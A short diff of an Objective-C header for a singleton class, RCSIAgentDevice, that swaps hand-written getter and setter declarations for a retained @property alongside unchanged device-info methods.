@@ -16,6 +16,8 @@
   NSMutableDictionary *mAgentConfiguration;
 }
 
+@property (readwrite, retain) NSMutableDictionary *mAgentConfiguration;
+
 + (RCSIAgentDevice *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
@@ -23,9 +25,6 @@
 - (unsigned)retainCount;
 - (void)release;
 - (id)autorelease;
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
-- (NSMutableDictionary *)mAgentConfiguration;
 
 - (BOOL)writeDeviceInfo: (NSData*)aInfo;
 - (BOOL)getDeviceInfo;
